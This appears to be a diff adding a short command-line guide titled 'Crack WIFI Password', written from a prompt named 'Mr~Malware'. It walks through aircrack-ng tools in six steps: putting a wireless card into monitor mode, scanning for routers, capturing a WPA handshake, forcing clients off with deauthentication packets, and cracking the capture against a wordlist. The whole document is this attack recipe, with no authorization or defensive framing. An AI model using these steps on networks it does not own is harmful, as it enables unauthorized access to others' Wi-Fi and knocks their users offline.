@@ -1,0 +1,14 @@
+Crack WIFI Password With "WordList" And a capture "Handshake"
+
+01. root@Mr~Malware:~# airmon-ng (For Checking Wireless Interfaces)
+
+02. root@Mr~Malware:~# airmon-ng start wlan0
+
+03. root@Mr~Malware:~# airodump-ng wlan0mon
+Press: CTRL+C (For stop Sacnning)
+
+04. root@Mr~Malware:~# airodump-ng -c (CH. no.) --bssid (Bssid of router) -w /root/Desktop/ wlan0mon
+
+05. root@Mr~Malware:~# aireplay-ng -0 5 -a (router MAC) -c (Client MAC) wlan0mon (Now we have a handshake on our Desktop)
+
+06. root@Mr~Malware:~# aircrack-ng -a2 -b (Router MAC) -w (Path of Wordlist.txt) root/Desktop/*.cap 
